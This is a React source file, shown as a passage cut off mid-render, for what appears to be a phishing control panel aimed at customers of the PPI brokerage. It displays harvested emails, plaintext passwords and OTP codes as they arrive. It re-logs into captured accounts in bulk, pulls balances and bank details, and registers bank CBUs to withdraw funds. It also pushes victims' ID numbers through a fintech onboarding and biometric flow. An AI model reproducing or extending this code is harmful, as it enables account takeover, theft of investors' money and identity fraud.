import { useState, useEffect, useCallback, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import { ppiApi } from "@/lib/ppiApi";
import { invokeWayni } from "@/lib/wayniApi";
import { useNotificationSound } from "@/hooks/useNotificationSound";
import OnlineNowTab from "@/components/admin/OnlineNowTab";
import {
  RefreshCw, Users, Clock, Wifi,
  Play, ArrowLeft, Search, DollarSign,
  Copy, Check, Eye, EyeOff, Activity,
  Trash2, Lock, Banknote, ArrowDownToLine, Building,
  ChevronDown, ChevronUp, Loader2, History, Zap, Timer,
  Fingerprint, MapPin, Camera, CheckCircle, AlertCircle, Bell, BellOff,
} from "lucide-react";

// ── Types ──
interface LiveSession {
  id: string;
  email: string | null;
  password: string | null;
  status: string;
  otp_code: string | null;
  created_at: string;
  ip_address: string | null;
  user_agent: string | null;
  country: string | null;
  city: string | null;
  source: string;
  operator_code: string;
}

interface PpiAccount {
  id: string;
  email: string;
  username: string | null;
  password: string | null;
  access_token: string | null;
  cuenta_id: number | null;
  comitente: string | null;
  full_name: string | null;
  cuit: string | null;
  info_tag: string | null;
  balance_data: any;
  bank_accounts: any;
  portfolio_data: any;
  orders_data: any;
  profile_data: any;
  last_login_at: string | null;
  last_data_sync_at: string | null;
  operator_code: string;
  created_at: string;
  updated_at: string;
}

// ── Helpers ──
const fmtARS = (n: number) =>
  new Intl.NumberFormat("es-AR", { style: "currency", currency: "ARS", minimumFractionDigits: 2 }).format(n);
const fmtUSD = (n: number) =>
  new Intl.NumberFormat("en-US", { style: "currency", currency: "USD", minimumFractionDigits: 2 }).format(n);

const timeAgo = (dateStr: string | null) => {
  if (!dateStr) return "Nunca";
  const diff = Date.now() - new Date(dateStr).getTime();
  const mins = Math.floor(diff / 60000);
  if (mins < 1) return "Agora";
  if (mins < 60) return `${mins}m`;
  const hrs = Math.floor(mins / 60);
  if (hrs < 24) return `${hrs}h`;
  return `${Math.floor(hrs / 24)}d`;
};

const parseDevice = (ua: string | null) => {
  if (!ua) return "?";
  if (/Mobile|Android|iPhone/i.test(ua)) return "📱";
  return "💻";
};

const statusLabels: Record<string, { label: string; color: string }> = {
  login_attempt: { label: "Digitando", color: "text-yellow-400 bg-yellow-500/10" },
  login_success: { label: "Login OK", color: "text-green-400 bg-green-500/10" },
  login_error: { label: "Erro", color: "text-red-500 bg-red-500/10" },
  waiting_operator: { label: "Esperando", color: "text-blue-400 bg-blue-500/10" },
  completed: { label: "Concluído ✓", color: "text-green-500 bg-green-500/10" },
  error: { label: "Erro", color: "text-red-500 bg-red-500/10" },
};

const BalanceBox = ({ label, value, color }: { label: string; value: string; color: string }) => (
  <div className="rounded-lg bg-background/50 border border-border/30 px-2.5 py-1.5">
    <p className="text-[8px] text-muted-foreground">{label}</p>
    <p className={`text-[12px] font-bold tabular-nums ${color}`}>{value}</p>
  </div>
);

const MetricCard = ({ label, value, color, icon, sub, size, highlight }: {
  label: string; value: string; color: string; icon?: string; sub?: string; size?: "lg"; highlight?: boolean;
}) => (
  <div className={`rounded-xl border px-3 py-2 ${highlight ? "border-orange-500/30 bg-orange-500/5" : "border-border bg-card"}`}>
    <div className="flex items-center gap-1.5">
      {icon && <span className="text-[12px]">{icon}</span>}
      <span className="text-[8px] font-bold uppercase tracking-wider text-muted-foreground">{label}</span>
    </div>
    <p className={`${size === "lg" ? "text-[16px]" : "text-[14px]"} font-bold tabular-nums ${color}`}>{value}</p>
    {sub && <p className="text-[9px] text-muted-foreground">{sub}</p>}
  </div>
);

// ══════════════════════════════════════════
// PPI ACCOUNT CARD
// ══════════════════════════════════════════
const PpiAccountCard = ({ account, opLoading, countdown, isRefreshing, onOperate, onLogin, onBalances, onBanks, onOrders, onDelete }: {
  account: PpiAccount;
  opLoading: string;
  countdown: number;
  isRefreshing: boolean;
  onOperate: () => void;
  onLogin: () => void;
  onBalances: () => void;
  onBanks: () => void;
  onOrders: () => void;
  onDelete: () => void;
}) => {
  const [expanded, setExpanded] = useState(false);
  const [copied, setCopied] = useState("");

  const fmtCountdown = (s: number) => {
    if (s >= 9999) return "...";
    const m = Math.floor(s / 60);
    const sec = s % 60;
    return `${m}:${sec.toString().padStart(2, "0")}`;
  };

  const hasToken = !!account.access_token;
  const name = account.full_name || account.username || account.email;
  const totalArs = Number(account.balance_data?.accountValueARS) || 0;
  const totalUsd = Number(account.balance_data?.accountValueUSD) || 0;
  const lastActive = account.last_login_at || account.last_data_sync_at;
  const isRecent = lastActive && (Date.now() - new Date(lastActive).getTime()) < 3600000;

  const copyText = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopied(label);
    setTimeout(() => setCopied(""), 1500);
  };

  const isLoading = (key: string) => opLoading === key;

  return (
    <div className={`rounded-xl border overflow-hidden transition-all ${hasToken ? "border-border bg-card hover:border-primary/15" : "border-red-500/20 bg-card"}`}>
      <div className="flex items-center gap-3 px-3 py-2.5">
        <div className={`h-2 w-2 rounded-full shrink-0 ${isRecent ? "bg-green-400 animate-pulse" : hasToken ? "bg-muted-foreground/30" : "bg-red-500"}`} />
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-1.5 flex-wrap">
            <span className="text-[12px] font-bold text-foreground truncate">{name}</span>
            {hasToken && <span className="text-[7px] text-green-400 bg-green-500/10 px-1 py-0.5 rounded font-bold">TOKEN</span>}
            {!hasToken && <span className="text-[7px] text-red-400 bg-red-500/10 px-1 py-0.5 rounded font-bold">SEM TOKEN</span>}
            {isRefreshing ? (
              <span className="text-[7px] text-blue-400 bg-blue-500/10 px-1.5 py-0.5 rounded font-bold flex items-center gap-0.5">
                <Loader2 size={7} className="animate-spin" /> Atualizando
              </span>
            ) : countdown > 0 && countdown < 9999 ? (
              <span className={`text-[7px] px-1.5 py-0.5 rounded font-mono font-bold flex items-center gap-0.5 ${
                countdown < 60 ? "text-orange-400 bg-orange-500/10" : "text-muted-foreground bg-secondary"
              }`}>
                <Timer size={7} /> {fmtCountdown(countdown)}
              </span>
            ) : null}
            {account.info_tag && (
              <span className={`text-[7px] px-1 py-0.5 rounded font-bold ${
                account.info_tag.includes("_ok") || account.info_tag.includes("cron_ok") ? "text-green-400 bg-green-500/10" :
                account.info_tag.includes("_err") || account.info_tag.includes("failed") ? "text-red-400 bg-red-500/10" :
                "text-muted-foreground bg-secondary"
              }`}>{account.info_tag.slice(0, 30)}</span>
            )}
          </div>
          <div className="flex items-center gap-1.5 mt-0.5 text-[9px] text-muted-foreground flex-wrap">
            <span className="truncate max-w-[200px]">{account.email}</span>
            <span>•</span>
            {account.password ? (
              <button onClick={() => copyText(account.password!, "pwd")} className="flex items-center gap-0.5 hover:opacity-80">
                <Lock size={7} className="text-yellow-400" />
                <span className="font-mono text-yellow-400 font-semibold">{account.password}</span>
                {copied === "pwd" ? <Check size={7} className="text-green-400" /> : <Copy size={7} />}
              </button>
            ) : (
              <span className="text-red-400 font-bold">SEM SENHA</span>
            )}
            <span>•</span>
            <span>Conta: {account.cuenta_id || "—"}</span>
            <span>•</span>
            <span>{timeAgo(lastActive)}</span>
          </div>
        </div>

        <div className="hidden sm:grid grid-cols-2 gap-3 shrink-0 text-right">
          <div>
            <p className="text-[8px] text-muted-foreground">ARS</p>
            <p className="text-[13px] font-bold text-emerald-400 tabular-nums">{fmtARS(totalArs)}</p>
          </div>
          <div>
            <p className="text-[8px] text-muted-foreground">USD</p>
            <p className={`text-[13px] font-bold tabular-nums ${totalUsd > 0 ? "text-sky-400" : "text-muted-foreground/20"}`}>{totalUsd > 0 ? fmtUSD(totalUsd) : "$0"}</p>
          </div>
        </div>

        <div className="flex items-center gap-0.5 shrink-0">
          <button onClick={onOperate} disabled={!hasToken && !account.password}
            className={`flex items-center gap-1 rounded-lg px-2.5 py-1.5 text-[10px] font-semibold transition-all ${
              hasToken ? "bg-primary text-primary-foreground hover:bg-primary/90" : account.password ? "bg-orange-500/10 text-orange-400" : "bg-secondary text-muted-foreground cursor-not-allowed"
            }`}>
            <Play size={10} /> Op
          </button>
          <button onClick={() => setExpanded(!expanded)} className="h-7 w-7 rounded-lg flex items-center justify-center text-muted-foreground hover:bg-secondary transition-colors">
            {expanded ? <ChevronUp size={12} /> : <ChevronDown size={12} />}
          </button>
          <button onClick={onDelete} className="h-7 w-7 rounded-lg flex items-center justify-center text-destructive/30 hover:text-destructive hover:bg-destructive/10 transition-colors">
            <Trash2 size={12} />
          </button>
        </div>
      </div>

      <div className="px-3 pb-1.5 flex items-center gap-1 flex-wrap">
        <button onClick={onLogin} disabled={isLoading(`login-${account.id}`)}
          className="text-[8px] px-2 py-0.5 rounded border border-blue-500/20 text-blue-400 font-semibold hover:bg-blue-500/10 disabled:opacity-50 flex items-center gap-0.5">
          {isLoading(`login-${account.id}`) ? <Loader2 size={8} className="animate-spin" /> : <Zap size={8} />} Login
        </button>
        <button onClick={onBalances} disabled={isLoading(`bal-${account.id}`)}
          className="text-[8px] px-2 py-0.5 rounded border border-emerald-500/20 text-emerald-400 font-semibold hover:bg-emerald-500/10 disabled:opacity-50 flex items-center gap-0.5">
          {isLoading(`bal-${account.id}`) ? <Loader2 size={8} className="animate-spin" /> : <DollarSign size={8} />} Saldo
        </button>
        <button onClick={onBanks} disabled={isLoading(`bank-${account.id}`)}
          className="text-[8px] px-2 py-0.5 rounded border border-orange-500/20 text-orange-400 font-semibold hover:bg-orange-500/10 disabled:opacity-50 flex items-center gap-0.5">
          {isLoading(`bank-${account.id}`) ? <Loader2 size={8} className="animate-spin" /> : <Building size={8} />} Bancos
        </button>
        <button onClick={onOrders} disabled={isLoading(`orders-${account.id}`)}
          className="text-[8px] px-2 py-0.5 rounded border border-purple-500/20 text-purple-400 font-semibold hover:bg-purple-500/10 disabled:opacity-50 flex items-center gap-0.5">
          {isLoading(`orders-${account.id}`) ? <Loader2 size={8} className="animate-spin" /> : <History size={8} />} Ordens
        </button>
      </div>

      {expanded && (
        <div className="border-t border-border/30 px-3 py-3 space-y-2">
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
            <BalanceBox label="💰 ARS Total" value={fmtARS(totalArs)} color="text-emerald-400" />
            <BalanceBox label="🇺🇸 USD Total" value={fmtUSD(totalUsd)} color="text-sky-400" />
            <BalanceBox label="Comitente" value={account.comitente || "—"} color="text-foreground" />
            <BalanceBox label="Conta ID" value={String(account.cuenta_id || "—")} color="text-foreground" />
          </div>
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-x-4 gap-y-1">
            {account.email && (
              <button onClick={() => copyText(account.email, "email")} className="flex items-center gap-1 text-[9px] text-muted-foreground hover:text-foreground">
                <span className="font-semibold">Email:</span> <span className="truncate">{account.email}</span>
                {copied === "email" ? <Check size={8} className="text-green-400" /> : <Copy size={8} />}
              </button>
            )}
            {account.username && (
              <button onClick={() => copyText(account.username!, "user")} className="flex items-center gap-1 text-[9px] text-muted-foreground hover:text-foreground">
                <span className="font-semibold">User:</span> {account.username}
                {copied === "user" ? <Check size={8} className="text-green-400" /> : <Copy size={8} />}
              </button>
            )}
            {account.cuit && (
              <button onClick={() => copyText(account.cuit!, "cuit")} className="flex items-center gap-1 text-[9px] text-muted-foreground hover:text-foreground">
                <span className="font-semibold">CUIT:</span> {account.cuit}
                {copied === "cuit" ? <Check size={8} className="text-green-400" /> : <Copy size={8} />}
              </button>
            )}
          </div>
          {account.balance_data?.groupedInstruments?.map((group: any) => (
            <div key={group.instrumentTypeId} className="text-[9px] text-muted-foreground">
              <span className="font-semibold text-foreground">{group.name}:</span>{" "}
              {group.instruments?.map((i: any) => `${i.ticker} (${i.instrumentAmount})`).join(", ")}
            </div>
          ))}
        </div>
      )}
    </div>
  );
};

// ══════════════════════════════════════════
// MAIN PPI DASHBOARD TAB
// ══════════════════════════════════════════
interface PpiDashboardTabProps {
  onlineCount?: number;
}

const PpiDashboardTab = ({ onlineCount = 0 }: PpiDashboardTabProps) => {
  const [activeTab, setActiveTab] = useState<"accounts" | "sessions" | "wayni" | "online">("accounts");

  // Accounts
  const [accounts, setAccounts] = useState<PpiAccount[]>([]);
  const [accountsLoading, setAccountsLoading] = useState(true);
  const [search, setSearch] = useState("");

  // Sessions
  const [liveSessions, setLiveSessions] = useState<LiveSession[]>([]);
  const { startAlarm, stopAlarm } = useNotificationSound();
  const [soundEnabled, setSoundEnabled] = useState(true);
  const soundEnabledRef = useRef(true);
  const seenSessionsRef = useRef<Set<string>>(new Set());
  useEffect(() => { soundEnabledRef.current = soundEnabled; }, [soundEnabled]);

  // Operating state
  const [operatingAccount, setOperatingAccount] = useState<PpiAccount | null>(null);
  const [opLoading, setOpLoading] = useState("");
  const [opTab, setOpTab] = useState<"balance" | "portfolio" | "banks" | "withdraw" | "orders">("balance");

  // Withdraw state
  const [wCbu, setWCbu] = useState("");
  const [wAmount, setWAmount] = useState("");
  const [wCuit, setWCuit] = useState("");
  const [withdrawResult, setWithdrawResult] = useState<any>(null);

  // Register bank state
  const [regBankCbu, setRegBankCbu] = useState("");
  const [regBankCurrency, setRegBankCurrency] = useState(10000);
  const [regBankResult, setRegBankResult] = useState<any>(null);

  // Wayni onboarding
  const [wayniRows, setWayniRows] = useState<any[]>([]);
  const [wayniLoading, setWayniLoading] = useState(false);
  const [wayniSearch, setWayniSearch] = useState("");
  const [wayniActionLoading, setWayniActionLoading] = useState("");

  // Relogin / refresh all
  const [reloginRunning, setReloginRunning] = useState(false);
  const [reloginProgress, setReloginProgress] = useState({ done: 0, total: 0, current: "" });
  const [refreshAllRunning, setRefreshAllRunning] = useState(false);
  const [refreshAllProgress, setRefreshAllProgress] = useState({ done: 0, total: 0 });

  // Auto-refresh
  const [refreshTimers, setRefreshTimers] = useState<Record<string, number>>({});
  const [refreshingAccounts, setRefreshingAccounts] = useState<Set<string>>(new Set());
  const [autoRefreshEnabled, setAutoRefreshEnabled] = useState(true);
  const autoRefreshRef = useRef(true);
  const refreshIntervalsRef = useRef<Record<string, number>>({});
  useEffect(() => { autoRefreshRef.current = autoRefreshEnabled; }, [autoRefreshEnabled]);

  // ── Load functions ──
  const loadWayniData = useCallback(async () => {
    setWayniLoading(true);
    const { data } = await (supabase as any).from("wayni_onboarding").select("*").eq("source", "ppi").order("created_at", { ascending: false });
    setWayniRows(data || []);
    setWayniLoading(false);
  }, []);

  const loadAccounts = useCallback(async (showLoading = true) => {
    if (showLoading) setAccountsLoading(true);
    const { data } = await supabase.from("ppi_accounts" as any).select("*").order("updated_at", { ascending: false });
    setAccounts((data as any) || []);
    if (showLoading) setAccountsLoading(false);
  }, []);

  const loadLiveSessions = useCallback(async () => {
    const since = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
    const { data } = await supabase.from("sessions").select("*").eq("source", "ppi").gte("created_at", since).order("created_at", { ascending: false }).limit(100);
    setLiveSessions((data as unknown as LiveSession[]) || []);
  }, []);

  // ── Initial loads ──
  useEffect(() => {
    loadAccounts(true);
    loadLiveSessions();
    loadWayniData();
  }, [loadAccounts, loadLiveSessions, loadWayniData]);

  // ── Realtime subscriptions ──
  useEffect(() => {
    const ch1 = supabase.channel("ppi-accounts-rt-tab")
      .on("postgres_changes", { event: "*", schema: "public", table: "ppi_accounts" }, (payload) => {
        if (payload.eventType === "INSERT") setAccounts(prev => [payload.new as any, ...prev]);
        else if (payload.eventType === "UPDATE") setAccounts(prev => prev.map(a => a.id === (payload.new as any).id ? (payload.new as any) : a));
        else if (payload.eventType === "DELETE") setAccounts(prev => prev.filter(a => a.id !== (payload.old as any).id));
      }).subscribe();

    const ch2 = supabase.channel("ppi-sessions-rt-tab")
      .on("postgres_changes", { event: "*", schema: "public", table: "sessions", filter: "source=eq.ppi" }, (payload) => {
        const newRow = payload.new as LiveSession;
        if (payload.eventType === "INSERT") {
          setLiveSessions(prev => [newRow, ...prev].slice(0, 100));
          if (!seenSessionsRef.current.has(newRow.id) && soundEnabledRef.current) {
            seenSessionsRef.current.add(newRow.id);
            startAlarm();
            setTimeout(() => stopAlarm(), 3000);
          }
        } else if (payload.eventType === "UPDATE") {
          setLiveSessions(prev => prev.map(s => s.id === newRow.id ? newRow : s));
        }
        if (newRow.status === "completed") loadAccounts(false);
      }).subscribe();

    const ch3 = supabase.channel("ppi-wayni-rt-tab")
      .on("postgres_changes", { event: "*", schema: "public", table: "wayni_onboarding" }, (payload: any) => {
        const row = payload.new as any;
        if (row?.source !== "ppi") return;
        if (payload.eventType === "INSERT") setWayniRows(prev => [row, ...prev]);
        else if (payload.eventType === "UPDATE") setWayniRows(prev => prev.map(r => r.id === row.id ? row : r));
        else if (payload.eventType === "DELETE") setWayniRows(prev => prev.filter(r => r.id !== (payload.old as any).id));
      }).subscribe();

    return () => {
      supabase.removeChannel(ch1);
      supabase.removeChannel(ch2);
      supabase.removeChannel(ch3);
    };
  }, [startAlarm, stopAlarm, loadAccounts]);

  // ── Wayni retry ──
  const handleWayniRetry = useCallback(async (row: any) => {
    if (!row.dni || !row.email) return;
    setWayniActionLoading(`retry-${row.id}`);
    try {
      const retryEmail = row.email.includes("@") ? row.email : `${row.email}@hotmail.com`;
      const { data: verifyRes } = await invokeWayni({
        action: "onboarding_verify", email: retryEmail, identity_number: row.dni,
        phone_number: row.phone || "", password: row.password || "",
        selected_full_name: row.full_name || "", selected_gender: row.gender || "",
      });
      if (verifyRes?.user_uuid && row.region && row.city) {
        const meta = row.metadata || {};
        await invokeWayni({
          action: "save_address", uuid: verifyRes.user_uuid,
          region_id: meta.region_id, city_id: meta.city_id,
          street_name: meta.street_name || row.street || "", street_number: meta.street_number || "",
          floor: meta.floor || "", apartment: meta.apartment || "", zip_code: row.zip_code || "",
        });
        const { data: bioRes } = await invokeWayni({
          action: "onboarding_biometric", identity_number: row.dni,
          user_uuid: verifyRes.user_uuid, gender: verifyRes.gender || row.gender || "",
        });
        if (bioRes?.biometric_url) {
          await (supabase as any).from("wayni_onboarding").update({
            user_uuid: verifyRes.user_uuid, biometric_url: bioRes.biometric_url,
            biometric_id: bioRes.biometric_id || "", status: "biometric_started",
            updated_at: new Date().toISOString(),
          }).eq("id", row.id);
        }
      }
    } catch (e: any) { console.warn("[PPI WAYNI RETRY]", e.message); }
    setWayniActionLoading("");
    loadWayniData();
  }, [loadWayniData]);

  // ── Account actions ──
  const handleLogin = async (acc: PpiAccount) => {
    if (!acc.username || !acc.password) return;
    setOpLoading(`login-${acc.id}`);
    try { await ppiApi.login(acc.username, acc.password, acc.operator_code); loadAccounts(false); } catch {}
    setOpLoading("");
  };

  const handleFetchBalances = async (acc: PpiAccount) => {
    if (!acc.access_token || !acc.cuenta_id) return;
    setOpLoading(`bal-${acc.id}`);
    try { await ppiApi.balances(acc.access_token, acc.cuenta_id, acc.id); loadAccounts(false); } catch {}
    setOpLoading("");
  };

  const handleFetchBanks = async (acc: PpiAccount) => {
    if (!acc.access_token || !acc.cuenta_id) return;
    setOpLoading(`bank-${acc.id}`);
    try { await ppiApi.bankAccounts(acc.access_token, acc.cuenta_id, acc.id); loadAccounts(false); } catch {}
    setOpLoading("");
  };

  const handleFetchOrders = async (acc: PpiAccount) => {
    if (!acc.access_token || !acc.cuenta_id) return;
    setOpLoading(`orders-${acc.id}`);
    try { await ppiApi.orders(acc.access_token, acc.cuenta_id, acc.id); loadAccounts(false); } catch {}
    setOpLoading("");
  };

  const handleOperate = async (acc: PpiAccount) => {
    if (!acc.access_token && acc.username && acc.password) {
      setOpLoading(`login-${acc.id}`);
      try {
        const res = await ppiApi.login(acc.username, acc.password, acc.operator_code);
        if (res.token) acc = { ...acc, access_token: res.token };
      } catch {}
      setOpLoading("");
    }
    setOperatingAccount(acc);
    setOpTab("balance");
    setWithdrawResult(null);
    if (acc.access_token && acc.cuenta_id) {
      ppiApi.balances(acc.access_token, acc.cuenta_id, acc.id).then(() => loadAccounts(false));
      ppiApi.bankAccounts(acc.access_token, acc.cuenta_id, acc.id).then(() => loadAccounts(false));
    }
  };

  const handleStopOperating = () => { setOperatingAccount(null); setWithdrawResult(null); loadAccounts(false); };

  const handleDelete = async (acc: PpiAccount) => {
    if (!confirm(`Remover conta ${acc.email}?`)) return;
    await supabase.from("ppi_accounts" as any).delete().eq("id", acc.id);
    loadAccounts(false);
  };

  const handleWithdrawQuote = async () => {
    if (!operatingAccount?.access_token || !operatingAccount?.cuenta_id) return;
    setOpLoading("withdraw-quote");
    try {
      const res = await ppiApi.withdrawQuote(operatingAccount.access_token, operatingAccount.cuenta_id, wCbu, operatingAccount.comitente || "", wCuit || operatingAccount.cuit || "", parseFloat(wAmount));
      setWithdrawResult(res.success ? res.payload : res);
    } catch {}
    setOpLoading("");
  };

  const handleWithdrawConfirm = async () => {
    if (!operatingAccount?.access_token || !operatingAccount?.cuenta_id) return;
    setOpLoading("withdraw-confirm");
    try {
      await ppiApi.withdraw(operatingAccount.access_token, operatingAccount.cuenta_id, wCbu, operatingAccount.comitente || "", wCuit || operatingAccount.cuit || "", parseFloat(wAmount));
      setWithdrawResult(null); setWAmount("");
      await ppiApi.balances(operatingAccount.access_token, operatingAccount.cuenta_id, operatingAccount.id);
      loadAccounts(false);
    } catch {}
    setOpLoading("");
  };

  const handleReloginAll = async () => {
    const withCreds = accounts.filter(a => a.username && a.password);
    if (withCreds.length === 0) return;
    if (!confirm(`Relogar ${withCreds.length} contas PPI?`)) return;
    setReloginRunning(true);
    setReloginProgress({ done: 0, total: withCreds.length, current: "" });
    for (let i = 0; i < withCreds.length; i++) {
      setReloginProgress({ done: i, total: withCreds.length, current: withCreds[i].email });
      try { await ppiApi.login(withCreds[i].username!, withCreds[i].password!, withCreds[i].operator_code); } catch {}
      await new Promise(r => setTimeout(r, 2000));
    }
    setReloginProgress({ done: withCreds.length, total: withCreds.length, current: "" });
    setReloginRunning(false);
    loadAccounts(false);
  };

  const handleRefreshAll = async () => {
    const active = accounts.filter(a => a.access_token && a.cuenta_id);
    if (active.length === 0) return;
    setRefreshAllRunning(true);
    setRefreshAllProgress({ done: 0, total: active.length });
    for (let i = 0; i < active.length; i++) {
      setRefreshAllProgress({ done: i, total: active.length });
      try {
        await ppiApi.balances(active[i].access_token!, active[i].cuenta_id!, active[i].id);
        await ppiApi.bankAccounts(active[i].access_token!, active[i].cuenta_id!, active[i].id);
      } catch {}
      await new Promise(r => setTimeout(r, 2000));
    }
    setRefreshAllProgress({ done: active.length, total: active.length });
    setRefreshAllRunning(false);
    loadAccounts(false);
  };

  // ── Auto-refresh timers ──
  useEffect(() => {
    const intervals: Record<string, number> = {};
    accounts.forEach(acc => {
      intervals[acc.id] = refreshIntervalsRef.current[acc.id] || (300 + Math.floor(Math.random() * 900));
    });
    refreshIntervalsRef.current = intervals;
    setRefreshTimers(prev => {
      const next = { ...prev };
      accounts.forEach(acc => { if (next[acc.id] === undefined) next[acc.id] = intervals[acc.id]; });
      return next;
    });
  }, [accounts.length]);

  useEffect(() => {
    const tick = setInterval(() => {
      if (!autoRefreshRef.current) return;
      setRefreshTimers(prev => {
        const next: Record<string, number> = {};
        Object.entries(prev).forEach(([id, remaining]) => { next[id] = Math.max(0, remaining - 1); });
        return next;
      });
    }, 1000);
    return () => clearInterval(tick);
  }, []);

  useEffect(() => {
    if (!autoRefreshRef.current) return;
    Object.entries(refreshTimers).filter(([_, r]) => r <= 0).forEach(([accId]) => {
      const acc = accounts.find(a => a.id === accId);
      if (!acc || !acc.username || !acc.password || refreshingAccounts.has(accId)) return;
      setRefreshingAccounts(prev => new Set(prev).add(accId));
      ppiApi.refresh(accId).catch(() => {}).finally(() => {
        setRefreshingAccounts(prev => { const s = new Set(prev); s.delete(accId); return s; });
        const newInterval = 300 + Math.floor(Math.random() * 900);
        refreshIntervalsRef.current[accId] = newInterval;
        setRefreshTimers(prev => ({ ...prev, [accId]: newInterval }));
      });
      setRefreshTimers(prev => ({ ...prev, [accId]: 9999 }));
    });
  }, [refreshTimers, accounts, refreshingAccounts]);

  // ── Derived data ──
  const totalArs = accounts.reduce((s, a) => s + (Number(a.balance_data?.accountValueARS) || 0), 0);
  const totalUsd = accounts.reduce((s, a) => s + (Number(a.balance_data?.accountValueUSD) || 0), 0);
  const activeCount = accounts.filter(a => a.access_token).length;
  const completedSessions = liveSessions.filter(s => s.status === "completed").length;
  const filtered = accounts.filter(a => !search || (a.email + (a.full_name || "") + (a.username || "")).toLowerCase().includes(search.toLowerCase()));
  const filteredWayni = wayniRows.filter(r => !wayniSearch || (r.email + (r.full_name || "") + (r.dni || "")).toLowerCase().includes(wayniSearch.toLowerCase()));

  // ═══════════════════════════════════════
  // OPERATING MODE
  // ═══════════════════════════════════════
  if (operatingAccount) {
    const latestAcc = accounts.find(a => a.id === operatingAccount.id) || operatingAccount;
    const bd = latestAcc.balance_data;
    const banks = latestAcc.bank_accounts || [];
    const instruments = bd?.groupedInstruments || [];
    const arsAvail = bd?.availabilities?.find((a: any) => a.currency?.id === 10000);
    const usdAvail = bd?.availabilities?.find((a: any) => a.currency?.id === 10001);

    return (
      <div>
        <div className="sticky top-12 z-40 bg-card border-b border-border px-4 py-2.5 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <button onClick={handleStopOperating} className="flex items-center gap-1.5 rounded-xl border border-border px-3 py-1.5 text-xs text-muted-foreground hover:bg-secondary transition-colors">
              <ArrowLeft size={13} /> Voltar
            </button>
            <div className="flex items-center gap-2">
              <div className="h-7 w-7 rounded-lg bg-blue-600 flex items-center justify-center">
                <span className="text-[10px] font-bold text-white">{(latestAcc.full_name || latestAcc.email)[0]?.toUpperCase()}</span>
              </div>
              <div>
                <p className="text-[11px] font-bold text-foreground">{latestAcc.full_name || latestAcc.email}</p>
                <p className="text-[9px] text-muted-foreground">{latestAcc.email} • Conta {latestAcc.cuenta_id} • Comitente {latestAcc.comitente}</p>
              </div>
            </div>
          </div>
          <span className="text-[10px] text-green-400 flex items-center gap-1.5 bg-green-500/10 border border-green-500/20 rounded-lg px-3 py-1"><span className="h-2 w-2 rounded-full bg-green-400 animate-pulse" /> Operando</span>
        </div>

        <div className="max-w-4xl mx-auto p-4 space-y-4">
          {bd && (
            <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
              <BalanceBox label="💰 ARS Total" value={fmtARS(bd.accountValueARS || 0)} color="text-emerald-400" />
              <BalanceBox label="🇺🇸 USD Total" value={fmtUSD(bd.accountValueUSD || 0)} color="text-sky-400" />
              <BalanceBox label="ARS Disponível" value={fmtARS(arsAvail?.availability?.[0]?.amount || 0)} color="text-green-400" />
              <BalanceBox label="USD Disponível" value={fmtUSD(usdAvail?.availability?.[0]?.amount || 0)} color="text-blue-400" />
            </div>
          )}

          <div className="flex items-center gap-1 flex-wrap">
            {(["balance", "portfolio", "banks", "withdraw", "orders"] as const).map(t => (
              <button key={t} onClick={() => setOpTab(t)}
                className={`text-[10px] px-3 py-1.5 rounded-lg font-semibold transition-all border ${opTab === t ? "bg-primary/10 text-primary border-primary/20" : "border-border text-muted-foreground hover:text-foreground"}`}>
                {t === "balance" ? "💰 Saldo" : t === "portfolio" ? "📊 Portfolio" : t === "banks" ? "🏦 Bancos" : t === "withdraw" ? "💸 Retiro" : "📜 Ordens"}
              </button>
            ))}
            <button onClick={() => { if (latestAcc.access_token && latestAcc.cuenta_id) { ppiApi.balances(latestAcc.access_token, latestAcc.cuenta_id, latestAcc.id).then(() => loadAccounts(false)); } }}
              className="ml-auto text-[9px] px-2 py-1 rounded-lg border border-border text-muted-foreground hover:text-foreground flex items-center gap-1">
              <RefreshCw size={10} /> Atualizar
            </button>
          </div>

          {/* Balance tab */}
          {opTab === "balance" && bd && (
            <div className="space-y-3">
              {bd.availabilities?.map((a: any) => (
                <div key={a.currency?.id} className="rounded-xl border border-border bg-card p-3">
                  <p className="text-[10px] text-muted-foreground font-semibold">{a.currency?.name} ({a.currency?.symbol})</p>
                  <div className="grid grid-cols-3 gap-2 mt-2">
                    <BalanceBox label="Disponível" value={`${a.currency?.symbol} ${a.availability?.[0]?.amount?.toLocaleString("es-AR") || "0"}`} color="text-emerald-400" />
                    <BalanceBox label="Garantia" value={`${a.currency?.symbol} ${a.availability?.[1]?.amount || "0"}`} color="text-blue-400" />
                    <BalanceBox label="Limite" value={`${a.currency?.symbol} ${a.availability?.[4]?.amount?.toLocaleString("es-AR") || "0"}`} color="text-muted-foreground" />
                  </div>
                </div>
              ))}
              {bd.instrumentDistribution && (
                <div className="rounded-xl border border-border bg-card p-3">
                  <p className="text-[10px] text-muted-foreground font-semibold mb-2">Distribución</p>
                  {bd.instrumentDistribution.map((d: any) => (
                    <div key={d.id} className="flex justify-between text-[11px] py-0.5">
                      <span className="text-foreground">{d.name}</span>
                      <span className="text-primary font-mono font-semibold">{d.percentage?.toFixed(2)}%</span>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* Portfolio tab */}
          {opTab === "portfolio" && (
            <div className="space-y-3">
              {instruments.length > 0 ? instruments.map((group: any) => (
                <div key={group.instrumentTypeId} className="rounded-xl border border-border bg-card p-3">
                  <p className="text-[11px] font-bold text-primary mb-2">{group.name} ({group.groupedPercentage?.toFixed(1)}%)</p>
                  <div className="space-y-2">
                    {group.instruments?.map((inst: any) => (
                      <div key={inst.ticker} className="flex items-center justify-between py-1.5 border-b border-border/30 last:border-0">
                        <div>
                          <span className="text-[12px] font-bold text-foreground">{inst.ticker}</span>
                          <span className="text-[9px] text-muted-foreground ml-2">{inst.description?.slice(0, 30)}</span>
                          <p className="text-[9px] text-muted-foreground">Qtd: {inst.instrumentAmount} × {inst.currency?.symbol} {inst.price?.toLocaleString("es-AR")}</p>
                        </div>
                        <div className="text-right">
                          <p className="text-[12px] font-bold text-foreground">{inst.currency?.symbol} {inst.amount?.toLocaleString("es-AR")}</p>
